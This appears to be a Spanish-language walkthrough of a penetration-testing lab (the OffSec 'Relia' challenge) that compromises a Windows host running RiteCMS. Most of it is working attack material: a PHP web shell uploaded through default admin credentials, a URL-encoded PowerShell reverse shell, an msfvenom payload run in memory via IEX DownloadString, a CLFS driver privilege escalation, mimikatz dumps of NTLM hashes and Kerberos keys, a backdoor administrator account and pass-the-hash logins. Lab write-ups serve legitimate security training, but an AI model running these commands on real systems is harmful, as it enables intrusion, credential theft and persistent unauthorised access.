/.htaccess            (Status: 403) [Size: 307]
/.hta.txt             (Status: 403) [Size: 307]
/.htpasswd.php        (Status: 403) [Size: 307]
/.htaccess.php        (Status: 403) [Size: 307]
/.htpasswd.txt        (Status: 403) [Size: 307]
/aux.txt              (Status: 403) [Size: 307]
/aux                  (Status: 403) [Size: 307]
/aux.php              (Status: 403) [Size: 307]
/cgi-bin/             (Status: 403) [Size: 307]
/cms                  (Status: 301) [Size: 348] [--> http://192.168.161.249:8000/cms/]
/CMS                  (Status: 301) [Size: 348] [--> http://192.168.161.249:8000/CMS/]
/com1.txt             (Status: 403) [Size: 307]
/com2.php             (Status: 403) [Size: 307]
/com2                 (Status: 403) [Size: 307]
/com1.php             (Status: 403) [Size: 307]
/com2.txt             (Status: 403) [Size: 307]
/com1                 (Status: 403) [Size: 307]
/com3.txt             (Status: 403) [Size: 307]
/com3                 (Status: 403) [Size: 307]
/com3.php             (Status: 403) [Size: 307]
/con.txt              (Status: 403) [Size: 307]
/con                  (Status: 403) [Size: 307]
/con.php              (Status: 403) [Size: 307]
/dashboard            (Status: 301) [Size: 354] [--> http://192.168.161.249:8000/dashboard/]
/examples             (Status: 503) [Size: 407]
/favicon.ico          (Status: 200) [Size: 30894]
/img                  (Status: 301) [Size: 348] [--> http://192.168.161.249:8000/img/]
/Index.php            (Status: 302) [Size: 0] [--> http://192.168.161.249:8000/dashboard/]
/index.php            (Status: 302) [Size: 0] [--> http://192.168.161.249:8000/dashboard/]
/index.php            (Status: 302) [Size: 0] [--> http://192.168.161.249:8000/dashboard/]
/licenses             (Status: 403) [Size: 426]
/lpt1                 (Status: 403) [Size: 307]
/lpt2                 (Status: 403) [Size: 307]
/lpt1.php             (Status: 403) [Size: 307]
/lpt2.php             (Status: 403) [Size: 307]
/lpt1.txt             (Status: 403) [Size: 307]
/lpt2.txt             (Status: 403) [Size: 307]
/nul.php              (Status: 403) [Size: 307]
/nul                  (Status: 403) [Size: 307]
/nul.txt              (Status: 403) [Size: 307]
/phpmyadmin           (Status: 403) [Size: 426]
/prn                  (Status: 403) [Size: 307]
/prn.txt              (Status: 403) [Size: 307]
/prn.php              (Status: 403) [Size: 307]
/server-info          (Status: 403) [Size: 426]
/server-status        (Status: 403) [Size: 426]
/webalizer            (Status: 403) [Size: 426]
Progress: 13842 / 13845 (99.98%)
===============================================================
Finished
===============================================================
```

#### Paso 2: Explotacion del vector RCE por RiteCMS v3

1. Accedemos a la url `http//192.168.xxx.249:8000/cms/admin.php`
2. Ingresamos credenciales por defecto **admin/admin** y generamos un login exitoso.
3. De los 4 metodos que expone Exploit Database usaremos el segundo para evadir las reglas de .htaccess.
4. Creamos el webshell.pHp 
> ⚠️ Importante: usar la extensión **.pHp**, respetando mayúsculas y minúsculas.

```php
<?php system($_GET[base64_decode('Y21k')]); ?>
```
#### Una vez creado el webshell.pHp lo subimos en cualquier directorio (media o files) y eso es todo. Tenemos RCE.
```
http://192.168.161.249:8000/cms/media/webshell.pHp?cmd=whoami

legacy\adrian 

---

http://192.168.161.249:8000/cms/media/webshell.pHp?cmd=ipconfig

Windows IP Configuration Ethernet adapter Ethernet0: 
Connection-specific DNS Suffix . : 
IPv4 Address. . . . . . . . . . . : 192.168.161.249 
Subnet Mask . . . . . . . . . . . : 255.255.255.0 
Default Gateway . . . . . . . . . : 192.168.161.254 

---
http://192.168.161.249:8000/cms/media/webshell.pHp?cmd=net user

User accounts for \\LEGACY 
------------------------------------------------------------------------------- 
Administrator 
adrian 
damon 
DefaultAccount 
Guest 
WDAGUtilityAccount 
The command completed successfully.
---
http://192.168.161.249:8000/cms/media/webshell.pHp?cmd=dir%20C:\Users\adrian\Desktop

Volume in drive C has no label. Volume Serial Number is 12DF-ECB8 Directory of C:\Users\adrian\Desktop 06/04/2025 02:01 PM
. 10/20/2022 01:45 AM
.. 06/04/2025 02:01 PM 34 local.txt 1 File(s) 34 bytes 2 Dir(s) 10,563,198,976 bytes free 
```
- Podemos obtener el primer flag: **local.txt**

```
http://192.168.161.249:8000/cms/media/webshell.pHp?cmd=type%20C:\Users\adrian\Desktop\local.txt
```
- Necesitamos un reverse shell en Lecgacy para trabajar con mas comodidad

Podemos ejecutar en una sola linea a traves del mismo shell que subimos y luego subir un backdoor de metasploit para obtener un shell mas robusto y estable.
```
powershell%20-nop%20-c%20%22$client%20%3D%20New-Object%20System.Net.Sockets.TCPClient('192.168.45.239'%2C4444)%3B$stream%20%3D%20$client.GetStream()%3B[byte[]]$bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile(($i%20%3D%20$stream.Read($bytes%2C%200%2C%20$bytes.Length))%20-ne%200)%7B%3B$data%20%3D%20(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString($bytes%2C0%2C%20$i)%3B$sendback%20%3D%20(iex%20$data%202%3E%261%20%7C%20Out-String)%20%3B$sendback2%20%3D%20$sendback%20%2B%20'PS%20'%20%2B%20(pwd).Path%20%2B%20'%3E%20'%3B$sendbyte%20%3D%20([text.encoding]::ASCII).GetBytes($sendback2)%3B$stream.Write($sendbyte%2C0%2C$sendbyte.Length)%3B$stream.Flush()%7D%22
```
- En nuestro receptor nc:

```powershell
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/2_Relia]
└─# nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.45.239] from (UNKNOWN) [192.168.180.249] 62914
whoami
legacy\adrian
PS C:\xampp\htdocs\cms\media>
```

- Enumeracion rapida antes de obtener un mejor shell:

```
PS C:\Users\adrian\Desktop> whoami /all
                                                                                                                                                                                                                  
USER INFORMATION                                                                                                                                                                                                  
----------------                                                                                                                                                                                                  
                                                                                                                                                                                                                  
User Name     SID                                                                                                                                                                                                 
============= ============================================                                                                                                                                                        
legacy\adrian S-1-5-21-464543310-226837244-3834982083-1004


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users         Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

PS C:\Users\adrian\Desktop> 

```

#### 📌 Resumen de lo encontrado
✅ Usuario:

    legacy\adrian

    SID: S-1-5-21-464543310-226837244-3834982083-1004

✅ Grupos:

    No forma parte de Administrators.

    Pero es miembro de Remote Desktop Users, lo que implica acceso por RDP si se habilita el servicio.

✅ Privilegios destacados:

    SeImpersonatePrivilege → ✅ Crítico para escalada de privilegios

    SeChangeNotifyPrivilege → común, no explotable

    SeCreateGlobalPrivilege → útil en algunas condiciones

    SeIncreaseWorkingSetPrivilege → normalmente no útil

Podemos usar PrintSpoofer para escalar privilegios y obtener credenciales para pivoting, movimiento lateral etc. pero antes debemos verificar
si el servicio **Spooler** esta corriendo y de lo contrario si podemos iniciarlo para ejecutar PrintSpoofer:

```powershell
PS C:\Users\adrian\Desktop> Get-Service Spooler

Status   Name               DisplayName                           
------   ----               -----------                           
Stopped  Spooler            Print Spooler                         


PS C:\Users\adrian\Desktop> Start-Service -Name Spooler
PS C:\Users\adrian\Desktop> Get-Service Spooler

Status   Name               DisplayName                           
------   ----               -----------                           
Stopped  Spooler            Print Spooler                         


PS C:\Users\adrian\Desktop>
```
Como no podemos iniciar el servicio, pasamos de momento a estabilizar el shell con **msf**

1. Creamos el backdoor.

```bash
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/2_Relia]
└─# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.239 LPORT=443 -f psh-reflection -o meterpreter.ps1
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 772 bytes
Final size of psh-reflection file: 3551 bytes
Saved as: meterpreter.ps1
```

* `windows/x64/meterpreter/reverse_https`: más estable y discreto que reverse_tcp.
* `-f psh-reflection`: formato para ejecución directa en memoria vía PowerShell.
* `meterpreter.ps1`: script que cargarás desde la víctima.

2. Levantamos un servidor en nuestro kali
3. Configuramos y ejecutamos nuestro meterpreter:
```meterpreter
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set LHOST 192.168.45.239
LHOST => 192.168.45.239
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) > 
[*] Started HTTPS reverse handler on https://192.168.45.239:443
[*] https://192.168.45.239:443 handling request from 192.168.180.249; (UUID: naypubax) Staging x64 payload (204892 bytes) ...
[*] Meterpreter session 1 opened (192.168.45.239:443 -> 192.168.180.249:62948) at 2025-06-05 10:57:56 -0300
```
4. Desde la maquina victima solicitamos y ejecutamos el backdoor.
```
IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.239:8000/meterpreter.ps1')
```
> Datos sobre este comando

➡️ Descarga y ejecuta en memoria directamente el contenido del script (meterpreter.ps1) desde nuestro servidor.

    DownloadString(...) → baja el texto del script.

    IEX (alias de Invoke-Expression) → ejecuta ese texto como código PowerShell.

🔸 No deja rastro en disco
🔸 Ideal para bypassear AVs básicos o EDRs sin disco

#### Paso 2: Escalada de privilegios en LEGACY
1. Enumeracion con nuestro meterpreter

La enumeracion basica que generamos nos da los mismos resultados que ya teniamos. Ejecutamos la session actual de meterpreter en background
y utilizamos el modulo **suggester**

```meterpreter
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf6 post(multi/recon/local_exploit_suggester) > run
[*] 192.168.180.249 - Collecting local exploits for x64/windows...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
[*] 192.168.180.249 - 203 exploit checks are being tried...
[+] 192.168.180.249 - exploit/windows/local/cve_2022_21882_win32k: The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022
[+] 192.168.180.249 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
[+] 192.168.180.249 - exploit/windows/local/cve_2023_28252_clfs_driver: The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default
[+] 192.168.180.249 - exploit/windows/local/cve_2024_30088_authz_basep: The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 1006
[+] 192.168.180.249 - exploit/windows/local/cve_2024_35250_ks_driver: The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022
[+] 192.168.180.249 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[*] Running check method for exploit 48 / 48
[*] 192.168.180.249 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022                                                                                        
 2   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.                                                                     
 3   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default                                                    
 4   exploit/windows/local/cve_2024_30088_authz_basep               Yes                      The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 1006                                                                                                  
 5   exploit/windows/local/cve_2024_35250_ks_driver                 Yes                      The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022    
 6   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
```
En pricipio vimos SeImpersonatePrivileges avilitados pero el servicio Spooler que necesitamos 
no se encuentra disponible, y tampoco tenemos permisos para iniciarlo.

Podemos intentar con **clfs_driver** en comparacion con **Spooler fool**

#### 🧠 Comparación Técnica de los Exploits

| CVE                | Nombre      | Requiere servicios | Requiere reinicio | Fiabilidad | Compatibilidad con Win Server 2022 |
| ------------------ | ----------- | ------------------ | ----------------- | ---------- | ---------------------------------- |
| **CVE-2022-21999** | SpoolFool   | **Sí**, `Spooler`  | No                | Media      | Compatible si el spooler corre     |
| **CVE-2023-28252** | CLFS Driver | **No**             | No                | **Alta**   | ✔️ Confirmado por Metasploit       |

#### Utilizamos msf el exploit clfs:

```meterpreter
msf6 exploit(multi/handler) > use exploit/windows/local/cve_2023_28252_clfs_driver
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > LHOST 192.168.45.239
[-] Unknown command: LHOST. Did you mean hosts? Run the help command for more details.
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set LHOST 192.168.45.239
LHOST => 192.168.45.239
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set LPORT 1234
LPORT => 1234
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > run
[*] Started reverse TCP handler on 192.168.45.239:1234 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default
[*] Launching msiexec to host the DLL...
[+] Process 4180 launched.
[*] Reflectively injecting the DLL into 4180...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (203846 bytes) to 192.168.180.249
[*] Meterpreter session 2 opened (192.168.45.239:1234 -> 192.168.180.249:62876) at 2025-06-05 17:05:53 -0300

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```
- Cargamos **kiwi** para obtener credenciales:

```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain  NTLM                              SHA1
--------       ------  ----                              ----
Administrator  LEGACY  387aef0561b65e4f3cae0960b0fba2d5  d85af7697714a10fdc862d2a36cfe1cfb9df046b
adrian         LEGACY  e3cea06e2de8d54d43b84d4b5bffb5b0  0471c9cb2ae0977d6fa051e6252d272a0e81ca75
pwned          LEGACY  8119935c5f7fa5f57135620c8073aaca  f60d7d6f41f4e0232b620aa2429cdaba85abc63d

wdigest credentials
===================

Username       Domain     Password
--------       ------     --------
(null)         (null)     (null)
Administrator  LEGACY     (null)
LEGACY$        WORKGROUP  (null)
adrian         LEGACY     (null)
pwned          LEGACY     (null)

kerberos credentials
====================

Username       Domain     Password
--------       ------     --------
(null)         (null)     (null)
Administrator  LEGACY     (null)
adrian         LEGACY     (null)
legacy$        WORKGROUP  (null)
pwned          LEGACY     (null)


meterpreter > 
```
> El usuario **pwned** es un usuario que genere yo para entrar por RDP:
```
meterpreter > shell
Process 4500 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\cms\media>cd C:\Users
cd C:\Users

C:\Users>net user pwned password123! /add
net user pwned password123! /add
The command completed successfully.


C:\Users>net localgroup Administrators pwned /add                                                                       
net localgroup Administrators pwned /add                                                                                
The command completed successfully.                                                                                     


C:\Users>net localgroup "Remote Desktop Users" pwned /add
net localgroup "Remote Desktop Users" pwned /add
The command completed successfully.


C:\Users>
```
#### Obtenemos el flag proof en .180.249

```powershell
PS C:\Users\Administrator\Desktop> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContin        ue

Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue

    Directory: C:\Users\adrian\Desktop

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          6/5/2025  12:38 PM             34 local.txt                                                            

    Directory: C:\Users\damon\Desktop

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          6/5/2025  12:38 PM             34 proof.txt                                                            


PS C:\Users\Administrator\Desktop> 

PS C:\Users> type damon\Desktop\proof.txt
type damon\Desktop\proof.txt
bda74c52627c3c64c3f59514ca124ed7
PS C:\Users>
```
- Ya obtivimos un hash NTLM del usuario administrador. 

```bash
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/2_Relia]
└─# evil-winrm -i 192.168.180.249 -u 'Administrator' -H 387aef0561b65e4f3cae0960b0fba2d5 -P 5985
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```
- A partir de este punto podemos acceder a esta maquina con permisos administrativos elevados y utilizar el host como punto de pivote mas adelante.

Buscamos mas credenciales en el host:

```powershell
meterpreter > kiwi_cmd "lsadump::sam"
Domain : LEGACY
SysKey : 64739ab3729cd3b69b8a2112d7f813bd
Local SID : S-1-5-21-464543310-226837244-3834982083

SAMKey : 182f3f06a90f8964d5f3e42a4471f991

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 387aef0561b65e4f3cae0960b0fba2d5

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 43c134075ee0781f000afa9852286526

* Primary:Kerberos-Newer-Keys *
    Default Salt : LEGACYAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8f63ebd63ab3648b2fd2b564171599b1ccef1dd2ae516747268e8e8c4b039b62
      aes128_hmac       (4096) : a8157f683f9b1ccf5eda82f45efb3645
      des_cbc_md5       (4096) : 297c2c64e0f7c1f1
    OldCredentials
      aes256_hmac       (4096) : 5d8412c2b5c287800912c25e1d01726d0a38dc92620817ac8b3a3695527b9176
      aes128_hmac       (4096) : d03fccb1f24da612e10c2dcc95ab1162
      des_cbc_md5       (4096) : 1004b6fe26da7a4a

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : LEGACYAdministrator
    Credentials
      des_cbc_md5       : 297c2c64e0f7c1f1
    OldCredentials
      des_cbc_md5       : 1004b6fe26da7a4a


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 1ab23de33bb51f7526de86958813cc52

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : bd034c3348b4c73a68bd0764114b4c3f

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 9ea70bf88c7654331ee08c544988a68cd1bd0080522ebd67d6b02996920d224c
      aes128_hmac       (4096) : 8379e6ae1779b92efacf24d6e65db8c2
      des_cbc_md5       (4096) : 1a1c01f797c7d97f

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 1a1c01f797c7d97f


RID  : 000003eb (1003)
User : damon
  Hash NTLM: 820d6348890893116880101307197052

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : a49961c60b9d2aaeec9bb7c61ef6d1cd

* Primary:Kerberos-Newer-Keys *
    Default Salt : LEGACYdamon
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : a3f799da4cbaa571b4467cd05bbe29e38f83e06d6c9bc1b9366e8f45d32c5c46
      aes128_hmac       (4096) : 59a4a6226b3adbe1f22a3bdf8cdef2c5
      des_cbc_md5       (4096) : 809707e5a21f585b
    OldCredentials
      aes256_hmac       (4096) : 256f14b48c75d006ada2471a6f6c48391528410d0948293db856c8ef1bb2eac5
      aes128_hmac       (4096) : d5e61e12c02242aacbb974008e04bbc8
      des_cbc_md5       (4096) : 0164388cef4664fd

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : LEGACYdamon
    Credentials
      des_cbc_md5       : 809707e5a21f585b
    OldCredentials
      des_cbc_md5       : 0164388cef4664fd


RID  : 000003ec (1004)
User : adrian
  Hash NTLM: e3cea06e2de8d54d43b84d4b5bffb5b0

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 0fe6dc1f684e736780d99ac621d13651

* Primary:Kerberos-Newer-Keys *
    Default Salt : LEGACYadrian
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 9d6caa520339858826216e146f197175983152ca6cc23600c90c59bb9f26ecca
      aes128_hmac       (4096) : 98a2a006eba652cdd5173acf15c16de8
      des_cbc_md5       (4096) : 45d6685898ae3e52
    OldCredentials
      aes256_hmac       (4096) : a1442b55e43679adca87f4cc85ff4a81cba38d6f967f15bfb79cff931f7fa1f6
      aes128_hmac       (4096) : 1b7ef6c5e883574d964cf0a80f3bd097
      des_cbc_md5       (4096) : 46c457ae237fd67c

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : LEGACYadrian
    Credentials
      des_cbc_md5       : 45d6685898ae3e52
    OldCredentials
      des_cbc_md5       : 46c457ae237fd67c


RID  : 000003ed (1005)
User : pwned
  Hash NTLM: 8119935c5f7fa5f57135620c8073aaca

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 45fefcdc634f3d8931565bbed0275460

* Primary:Kerberos-Newer-Keys *
    Default Salt : LEGACYpwned
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : b79d6551adebfe18ef9f0230d94a17c5cfb226b25de0ad73dc122a417aed12e5
      aes128_hmac       (4096) : 7978a7fed2bd218bc91190cb5d9995c4
      des_cbc_md5       (4096) : a86462dcda2cab10

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : LEGACYpwned
    Credentials
      des_cbc_md5       : a86462dcda2cab10
```

- **Con estas credenciales nos aseguramos el acceso al host LEGACY**

```bash
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/2_Relia]
└─# evil-winrm -i 192.168.180.249 -u 'damon' -H 820d6348890893116880101307197052 -P 5985 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\damon\Documents> 
```
- **Varios doritos despues no encontramos nada de interes en LEGACY** 

> Continuamos con **MSF** en la maquina 192.168.231.245

1. Ejecutamos **db_nmap** para poder automatizar un poco la enumeracion de la misma.

```bash
msf6> db_nmap -A 192.168.231.245
[*] Nmap: Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 17:55 -03
[*] Nmap: Nmap scan report for 192.168.231.245
[*] Nmap: Host is up (0.17s latency).
[*] Nmap: Not shown: 995 closed tcp ports (reset)                                                                                                                                                                 
[*] Nmap: PORT     STATE SERVICE  VERSION                                                                                                                                                                         
[*] Nmap: 21/tcp   open  ftp      vsftpd 2.0.8 or later                                                                                                                                                           
[*] Nmap: | ftp-syst:                                                                                                                                                                                             
[*] Nmap: |   STAT:                                                                                                                                                                                               
[*] Nmap: | FTP server status:                                                                                                                                                                                    
[*] Nmap: |      Connected to 192.168.45.239                                                                                                                                                                      
[*] Nmap: |      Logged in as ftp                                                                                                                                                                                 
[*] Nmap: |      TYPE: ASCII                                                                                                                                                                                      
[*] Nmap: |      No session bandwidth limit                                                                                                                                                                       
[*] Nmap: |      Session timeout in seconds is 300                                                                                                                                                                
[*] Nmap: |      Control connection is plain text                                                                                                                                                                 
[*] Nmap: |      Data connections will be plain text                                                                                                                                                              
[*] Nmap: |      At session startup, client count was 3                                                                                                                                                           
[*] Nmap: |      vsFTPd 3.0.3 - secure, fast, stable                                                                                                                                                              
[*] Nmap: |_End of status                                                                                                                                                                                         
[*] Nmap: |_ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                                                                                                  
[*] Nmap: 80/tcp   open  http     Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)                                                                                                           
[*] Nmap: |_http-title: RELIA Corp.                                                                                                                                                                               
[*] Nmap: | http-methods:                                                                                                                                                                                         
[*] Nmap: |_  Potentially risky methods: TRACE                                                                                                                                                                    
[*] Nmap: |_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8                                                                                                                     
[*] Nmap: 443/tcp  open  ssl/http Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)                                                                                                           
[*] Nmap: | http-methods:                                                                                                                                                                                         
[*] Nmap: |_  Potentially risky methods: TRACE                                                                                                                                                                    
[*] Nmap: |_http-title: RELIA Corp.                                                                                                                                                                               
[*] Nmap: |_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
[*] Nmap: | ssl-cert: Subject: commonName=web01.relia.com/organizationName=RELIA/stateOrProvinceName=Berlin/countryName=DE
[*] Nmap: | Not valid before: 2022-10-12T08:55:44
[*] Nmap: |_Not valid after:  2032-10-09T08:55:44
[*] Nmap: |_ssl-date: TLS randomness does not represent time
[*] Nmap: | tls-alpn:
[*] Nmap: |_  http/1.1
[*] Nmap: 2222/tcp open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
[*] Nmap: | ssh-hostkey:
[*] Nmap: |   3072 30:0c:6c:9b:ac:07:47:5e:df:6d:ff:38:63:38:2a:fd (RSA)
[*] Nmap: |   256 f3:a9:70:76:c8:d4:c4:17:f4:39:1f:be:58:9d:1f:a5 (ECDSA)
[*] Nmap: |_  256 21:a0:79:82:2d:e6:2a:76:11:24:2f:7e:2e:a8:c7:83 (ED25519)
[*] Nmap: 8000/tcp open  http     Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
[*] Nmap: | http-methods:
[*] Nmap: |_  Potentially risky methods: TRACE
[*] Nmap: |_http-open-proxy: Proxy might be redirecting requests
[*] Nmap: |_http-title: Site doesn't have a title (text/html).
[*] Nmap: |_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
[*] Nmap: Device type: general purpose|router
[*] Nmap: Running: Linux 5.X, MikroTik RouterOS 7.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
[*] Nmap: OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
[*] Nmap: Network Distance: 4 hops
[*] Nmap: Service Info: Host: RELIA; OS: Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: TRACEROUTE (using port 111/tcp)
[*] Nmap: HOP RTT       ADDRESS
[*] Nmap: 1   238.85 ms 192.168.45.1
[*] Nmap: 2   238.89 ms 192.168.45.254
[*] Nmap: 3   238.91 ms 192.168.251.1
[*] Nmap: 4   239.00 ms 192.168.231.245
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 28.49 seconds
msf6 auxiliary(scanner/http/http_version) > back
msf6 > services
Services
========

host             port  proto  name      state  info
----             ----  -----  ----      -----  ----
192.168.231.245  21    tcp    ftp       open   vsftpd 2.0.8 or later
